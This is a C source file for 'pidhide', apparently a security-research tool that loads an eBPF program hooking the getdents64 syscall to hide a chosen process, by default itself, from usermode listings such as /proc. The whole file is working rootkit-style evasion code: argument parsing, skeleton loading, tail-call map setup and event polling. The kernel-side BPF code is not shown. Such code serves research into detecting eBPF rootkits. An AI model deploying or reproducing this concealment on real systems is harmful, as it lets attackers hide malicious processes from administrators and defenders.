// SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause)
/* Copyright (c) 2024 Crowdstrike */
#include <argp.h>
#include <signal.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "common_um.h"
#include "pidhide.skel.h"

// Setup Argument stuff
static struct env {
    int pid_to_hide;
    int target_ppid;
} env;

const char *argp_program_version = "pidhide 2.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"PID Hider\n"
"\n"
"Uses eBPF to hide a process from usermode processes\n"
"By hooking the getdents64 syscall and unlinking the pid folder\n"
"\n"
"USAGE: ./pidhide -p 2222 [-t 1111]\n";

static const struct argp_option opts[] = {
    { "pid-to-hide", 'p', "PID-TO-HIDE", 0, "Process ID to hide. Defaults to this program" },
    { "target-ppid", 't', "TARGET-PPID", 0, "Optional Parent PID, will only affect its children." },
    {},
};

static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        errno = 0;
        env.pid_to_hide = strtol(arg, NULL, 10);
        if (errno || env.pid_to_hide <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct pidhide_bpf *skel;
    int err;

    /* Parse command line arguments */
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err)
        return err;

    /* Setup common tasks*/
    if (!setup()) {
        fprintf(stderr, "Failed to do common setup\n");
        return 1;
    };

    /* Load and verify BPF application */
    skel = pidhide_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open and load BPF skeleton\n");
        return 1;
    }

    /* Set the Pid to hide, defaulting to our own PID */
    char pid_to_hide[10];
    if (env.pid_to_hide == 0) {
        env.pid_to_hide = getpid();
    }
    sprintf(pid_to_hide, "%d", env.pid_to_hide);
    strncpy(skel->rodata->pid_to_hide, pid_to_hide, sizeof(skel->rodata->pid_to_hide));
    skel->rodata->pid_to_hide_len = strlen(pid_to_hide)+1;
    skel->rodata->target_ppid = env.target_ppid;


    /* Load & verify BPF programs */
    err = pidhide_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }

    /* Setup Maps for tail calls */
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map__update_elem(
        skel->maps.map_prog_array,
        &index,
        sizeof(index),
        &prog_fd,
        sizeof(prog_fd),
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    /* Attach tracepoints */
    err = pidhide_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }

    /* Set up ring buffer polling */
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    /* Process events */
    printf("Successfully started!\n");
    printf("Hiding PID %d\n", env.pid_to_hide);
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    /* Clean up */
    ring_buffer__free(rb);
    pidhide_bpf__destroy(skel);

    return err < 0 ? -err : 0;
}
